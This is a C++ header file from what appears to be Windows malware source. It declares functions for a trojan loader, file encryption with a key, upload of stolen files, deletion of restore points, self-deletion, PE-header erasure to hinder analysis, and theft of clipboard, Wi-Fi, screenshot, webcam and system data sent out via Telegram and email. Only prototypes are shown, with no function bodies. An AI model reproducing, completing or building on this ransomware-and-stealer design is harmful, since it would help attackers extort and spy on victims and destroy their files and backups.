#pragma once
#include "../commons/common.h"
#include "json.hpp"
#include <fstream>
#include <sstream>
#include <dshow.h>
#include <iomanip>
#include <atlstr.h>
#include <wininet.h>
#include <atlimage.h>
#include <winternl.h>
#include <VersionHelpers.h>
#include <experimental/filesystem>
#import "libid:78530B68-61F9-11D2-8CAD-00A024580902" raw_interfaces_only named_guids

#pragma comment(lib, "urlmon.lib")
#pragma comment(lib,"Wininet.lib")
#pragma comment(lib, "strmiids.lib")


typedef struct timeval2 {
    long tv_sec;
    long tv_usec;
} timeval2;

std::string Exec(const char* cmd);
bool Copyfile(const char* From, const char* To);
std::string PowershellEncodedCommand(const std::string& cmd);
DWORD TrojanFunction(LPVOID url);
DWORD RemoveTasks(LPVOID params_useless);
void PEHeaderDeleter();
void ImageSizeIncreaser();
void GetAllFiles(const std::string& username);
int GetTimeOfDay(struct timeval* tp, struct timezone* tzp);
std::string GenerateRandom(const int len);
std::vector<std::string> GetFiles(const std::string& mainDir);
std::vector<std::string> Split(const std::string& s,const char& delimiter);
bool FileExists(const std::string& name);
std::string GetDate();
std::string GetHWID();
std::string GetIPData();
std::string GetCPU();
std::string GetGPU();
std::string GetPcName();
std::string GetUsername();
std::string GetResolution();
std::string GetWinVersion();
std::string GetLanguage();
std::string GetClipboard();
std::string GetScreenshot();
std::string GetWifi();
std::vector<std::string> GetLinks();
std::vector<std::string> GetWebcams();
void SendEmail();
void DropFile(const std::string& content,const std::string& path);
void ChangeWallpaper(const std::string& content);
bool IsConnected2Internet();
void ScheduleTask();
std::vector<std::vector<std::string>> VectorSplitter(const std::vector<std::string>& baseVector, int parts);
void DeleteRestorePoints();
void DeleteMe(const std::string& myPath);
void EncryptFiles(const std::vector<std::string>& files,const std::string& key);
void UploadFiles(const std::vector<std::string>& files);
void TakeWebcams();
void ChangeIcon();
void SendTelegramInfo();
